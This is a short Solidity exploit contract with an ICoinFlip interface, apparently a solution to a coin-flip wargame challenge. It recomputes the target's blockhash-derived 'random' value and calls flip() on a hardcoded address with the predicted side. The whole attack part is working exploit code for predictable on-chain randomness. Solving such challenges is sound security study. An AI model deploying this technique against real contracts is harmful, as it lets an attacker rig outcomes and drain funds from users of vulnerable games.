//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "./ICoinFlip.sol";

contract Guesser {
    ICoinFlip inst;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        inst = ICoinFlip(0x77Dcb482A0122f3B7E6Fa2b2B1370a04a4796d22);
    }

    function guess() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        
        uint256 coinFlip = blockValue / (FACTOR);
        bool side = coinFlip == 1 ? true : false;

        inst.flip(side);
    }
}

//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}